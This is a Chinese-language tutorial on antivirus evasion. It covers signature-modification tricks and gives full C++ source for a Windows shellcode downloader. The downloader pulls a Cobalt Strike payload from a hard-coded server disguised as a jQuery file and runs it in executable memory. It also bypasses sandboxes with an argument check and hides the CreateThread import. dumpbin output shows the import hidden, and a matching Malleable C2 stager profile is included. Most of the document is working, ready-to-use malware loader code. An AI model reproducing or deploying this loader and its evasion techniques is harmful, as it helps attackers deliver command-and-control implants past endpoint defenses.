# 常规免杀思路

## 静态查杀

模糊哈希算法又叫基于内容分割的分片分片哈希算法（context triggered piecewise hashing, CTPH），主要用于文件的相似性比较。

大致就可以理解为，不要把一个文件的所有内容都拿来计算hash，而通过分片，取出部分重要（不易改变）的内容进行hash计算，这样就能达到通过一个特征码找到类似的病毒变种。

## 手工修改

### 无源码

#### 数据方面

- 字符串，如果不影响程序逻辑，可以替换大小写；无关紧要的数据，随意替换；
- 整数，如果不影响结果，替换值，清零等操作。
- 地址，基本不能修改。
- PE头数据，根据PE结构具体来看，无用数据清零或修改。

#### 代码方面

- 等价替换汇编代码，如mov eax，0可以换成xor eax，eax，直接结果相同，二进制代码不同。
- 在不影响逻辑的情况下，交换代码顺序。
- 代码块移位，将代码块移动不用的内存位置，通过加入jmp addr跳过去执行，addr是新的代码块地址。

### 有源码

- 如果特征码是数据，那么修改数据位置，访问数据的代码位置等。
- 加花指令。
- 加数据计算代码，加减乘除各类组合。
- 加字符串操作代码，增加、删除、查找、替换等。
- 加多层跳转，跳转间加无效指令。
- 加貌似有效的API调用，如LoadLibrary+GetProcAddr+API等等。

## 工具免杀

在没找到有效的特征码，或者不好修改的时候，可以试试这种方式。

### 资源操作

使用Resource Hacker对文件进行资源操作，找来多个正常软件，将它们的资源加入到自己软件，如图片，版本信息，对话框等。使用资源编辑器(Resource Hacker)5.1.7汉化版打开文件->操作->从资源文件添加

# 下载器原理实现

```c++
/*
#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <WinInet.h>
//using namespace std;
#pragma comment(lib,"wininet")
int main(int argc, char* argv[]) {
    //if (argc > 1)//通过传入参数绕过沙箱
    {
        HINTERNET nethandle = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; WOW64) (KHTML, like Gecko) Chrome/77.0 Safari/536", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);//user-agent可以修改
        if (nethandle == NULL) {
            printf("internet open error:%d\n", GetLastError());
            return 0;
        }
        char* host = (char*)"192.168.211.129";//cs的ip
        HINTERNET Session = InternetConnectA(nethandle, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (Session == NULL)
        {
            printf("internet connect error:%d\n", GetLastError());
            return 0;
        }
        HINTERNET HttpRequest = HttpOpenRequestA(Session, "GET", "/jquery-3.3.2.slim.min.js", "HTTP/1.0", NULL, NULL, INTERNET_FLAG_DONT_CACHE, 0);//通过get请求profile文件中的url地址
        if (HttpRequest == NULL) {
            printf("http open request error:%d\n", GetLastError());
            return 0;
        }
        int ret = HttpSendRequestA(HttpRequest, NULL, 0, NULL, 0);
        if (ret == FALSE) {
            printf("http send request error:%d\n", GetLastError());
            return 0;
        }
        char* statscode[16] = { 0 };
        int size = 16;
        ret = HttpQueryInfoA(HttpRequest, HTTP_QUERY_STATUS_CODE, statscode, (LPDWORD)&size, NULL);
        if (ret == FALSE) {
            printf("httpqueryinfo error:%d\n", GetLastError());
            return 0;
        }
        int scode = atoi((const char*)statscode);
        printf("code:%d\n", scode);
        if (scode != HTTP_STATUS_OK && scode != HTTP_STATUS_CREATED) {
            printf("%d please retry\n", scode);
            return 0;
        }
        char* contentL[16] = { 0 };
        size = 16;
        ret = HttpQueryInfoA(HttpRequest, HTTP_QUERY_CONTENT_LENGTH, contentL, (LPDWORD)&size, NULL);
        int length = atoi((const char*)contentL);
        //cout << "length:" << length << "\n";
        if (ret == FALSE) {
            printf("htttpqueryinfo error:%d\n", GetLastError());
            return 0;
        }
        void* c = VirtualAlloc(NULL, length + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        int readed = 0;
        InternetReadFile(HttpRequest, c, length + 1, (LPDWORD)&readed);
        char* cc = (char*)c + 11;//跳过配置文件前面追加字符
        HANDLE ct = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)cc, NULL, 0, NULL);//这里可能会被检测到api
        WaitForSingleObject(ct, INFINITE);
        VirtualFree(c, length + 1, MEM_DECOMMIT);
    }
    //else {
    //    printf("hello world\n");
    //}
    return 0;
}
*/
#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <Wininet.h>
using namespace std;
#pragma comment(lib,"wininet")
typedef _Ret_maybenull_ _Post_writable_byte_size_(dwSize) LPVOID(WINAPI* PVA)(
    _In_opt_ LPVOID lpAddress,
    _In_     SIZE_T dwSize,
    _In_     DWORD flAllocationType,
    _In_     DWORD flProtect
    );

typedef WINBASEAPI _Ret_maybenull_ HANDLE(WINAPI* PCT)(
    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_     SIZE_T dwStackSize,
    _In_     LPTHREAD_START_ROUTINE lpStartAddress,
    _In_opt_ __drv_aliasesMem LPVOID lpParameter,
    _In_     DWORD dwCrationFlags,
    _Out_opt_ LPDWORD lpThreadId
    );
int main(int argc, char* argv[]) {
    if (argc > 1) {//通过传入参数绕过沙箱
        HINTERNET nethandle = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; WOW64) (KHTML, like Gecko) Chrome/77.0 Safari/536", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);//user-agent可以修改
        if (nethandle == NULL) {
            printf("internet open error:%d\n", GetLastError());
            return 0;
        } 
        char* host = (char*)"192.168.211.129";//cs的ip
        HINTERNET Session = InternetConnectA(nethandle, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (Session == NULL)
        {
            printf("internet connect error:%d\n", GetLastError());
            return 0;
        }
        HINTERNET HttpRequest = HttpOpenRequestA(Session, "GET", "/jquery-3.3.2.slim.min.js", "HTTP/1.0", NULL, NULL, INTERNET_FLAG_DONT_CACHE, 0);//通过get请求profile文件中的url地址
        if (HttpRequest == NULL) {
            printf("http open request error:%d\n", GetLastError());
            return 0;
        }
        int dwFlags;
        int size = sizeof(dwFlags);
        InternetQueryOptionA(HttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, (LPDWORD)&size);
        dwFlags = dwFlags | SECURITY_FLAG_IGNORE_UNKNOWN_CA;
        InternetSetOptionA(HttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
        int ret = HttpSendRequestA(HttpRequest, NULL, 0, NULL, 0);
        if (ret == FALSE) {
            printf("http send request error:%d\n", GetLastError());
            return 0;
        }
        char* statscode[16] = { 0 };
        size = 16;
        ret = HttpQueryInfoA(HttpRequest, HTTP_QUERY_STATUS_CODE, statscode, (LPDWORD)&size, NULL);
        if (ret == FALSE) {
            printf("httpqueryinfo error:%d\n", GetLastError());
            return 0;
        }
        int scode = atoi((const char*)statscode);
        printf("code:%d\n", scode);
        if (scode != HTTP_STATUS_OK && scode != HTTP_STATUS_CREATED) {
            printf("%d please retry\n", scode);
            return 0;
        }
        PVA VA = (PVA)GetProcAddress(LoadLibraryA("kernel32.dll"), "VirtualAlloc");
        if (VA = NULL) {
            printf("get function error:%d\n", GetLastError());
            return 0;
        }
        char* contentL[16] = { 0 };
        size = 16;
        ret = HttpQueryInfoA(HttpRequest, HTTP_QUERY_CONTENT_LENGTH, contentL, (LPDWORD)&size, NULL);
        int length = atoi((const char*)contentL);
        cout << "length:" << length << "\n";
        if (ret == FALSE) {
            printf("htttpqueryinfo error:%d\n", GetLastError());
            return 0;
        }
        void* c = VirtualAlloc(NULL, length + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        int readed = 0;
        InternetReadFile(HttpRequest, c, length + 1, (LPDWORD)&readed);
        char* cc = (char*)c + 11;//跳过配置文件前面追加字符
        PCT ppct=(PCT)GetProcAddress(LoadLibraryA("kernel32.dll"), "CreateThread");//隐藏导入api函数
        HANDLE ct = ppct(NULL, 0, (LPTHREAD_START_ROUTINE)cc, NULL, 0, NULL);
        WaitForSingleObject(ct, INFINITE);
        VirtualFree(c, length + 1, MEM_DECOMMIT);
    }
    return 0;
}
```

导入表对比，打开Developer Command Prompt，可以看到敏感函数`CreateThread`

```powershell
E:\code\c\vs2019代码\ConsoleApplication7\x64\Release>dumpbin /imports ConsoleApplication7.exe
Microsoft (R) COFF/PE Dumper Version 14.29.30038.1
Copyright (C) Microsoft Corporation.  All rights reserved.
Dump of file ConsoleApplication7.exe
File Type: EXECUTABLE IMAGE
  Section contains the following imports:
    KERNEL32.dll
             140003000 Import Address Table
             140003BB8 Import Name Table
                     0 time date stamp
                     0 Index of first forwarder reference
                         5DC VirtualFree
                         5D9 VirtualAlloc
                         5EA WaitForSingleObject
                         26A GetLastError
                          F5 CreateThread
                         385 IsDebuggerPresent
                         36F InitializeSListHead
                         2F3 GetSystemTimeAsFileTime
                         225 GetCurrentThreadId
                         221 GetCurrentProcessId
                         452 QueryPerformanceCounter
                         38C IsProcessorFeaturePresent
                         59E TerminateProcess
                         220 GetCurrentProcess
                         57F SetUnhandledExceptionFilter
                         5C0 UnhandledExceptionFilter
                         4E3 RtlVirtualUnwind
                         4DC RtlLookupFunctionEntry
                         4D5 RtlCaptureContext
                         281 GetModuleHandleW
```

第二种方法绕过`CreateThread`函数检测

```powershell
E:\code\c\vs2019代码\ConsoleApplication7\x64\Release>dumpbin /imports ConsoleApplication7.exe
Microsoft (R) COFF/PE Dumper Version 14.29.30038.1
Copyright (C) Microsoft Corporation.  All rights reserved.
Dump of file ConsoleApplication7.exe
File Type: EXECUTABLE IMAGE
  Section contains the following imports:
    KERNEL32.dll
             140003000 Import Address Table
             140003CC8 Import Name Table
                     0 time date stamp
                     0 Index of first forwarder reference
                         5DC VirtualFree
                         5D9 VirtualAlloc
                         5EA WaitForSingleObject
                         26A GetLastError
                         3C8 LoadLibraryA
                         2B8 GetProcAddress
                         385 IsDebuggerPresent
                         36F InitializeSListHead
                         2F3 GetSystemTimeAsFileTime
                         225 GetCurrentThreadId
                         221 GetCurrentProcessId
                         452 QueryPerformanceCounter
                         38C IsProcessorFeaturePresent
                         59E TerminateProcess
                         220 GetCurrentProcess
                         57F SetUnhandledExceptionFilter
                         5C0 UnhandledExceptionFilter
                         4E3 RtlVirtualUnwind
                         4DC RtlLookupFunctionEntry
                         4D5 RtlCaptureContext
                         281 GetModuleHandleW
```

profile文件需要将http-stager中的server中的prepend修改成对应长度字符

```js
http-stager {  
    set uri_x86 "/jquery-3.3.1.slim.min.js";
    set uri_x64 "/jquery-3.3.2.slim.min.js";
    client {
 	header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.5";
        #header "Host" "code.jquery.com";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";
    }
    server {
        header "Server" "NetDNA-cache/2.2";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";
        output {
            #GZIP headers and footers      
            prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03\x01";
            append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";
            print;
        }
    }
}
```

